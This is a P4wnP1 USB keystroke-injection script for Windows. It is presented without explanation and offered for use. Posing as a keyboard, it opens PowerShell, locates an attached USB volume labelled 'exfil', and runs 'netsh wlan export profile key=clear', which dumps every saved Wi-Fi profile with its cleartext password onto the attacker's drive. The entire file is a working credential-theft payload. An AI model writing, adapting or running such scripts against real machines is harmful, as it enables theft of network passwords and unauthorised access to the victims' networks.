// You need to setup P4wnP1 USB Gadget Settings as HID keyboard and Mass storage
// Create storage using genimg: "/usr/local/P4wnP1/helper/genimg -i -s 500 -o exfil -l exfil"

layout('us') 
press("GUI r")
delay(200)
type("powershell\n") 
delay(1200)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'exfil' } | select name \n") 
delay(1200)
type("cd $usbpath.name\n")
delay(1200)
type("netsh wlan export profile key=clear\n")
delay(1200)
type("exit\n")
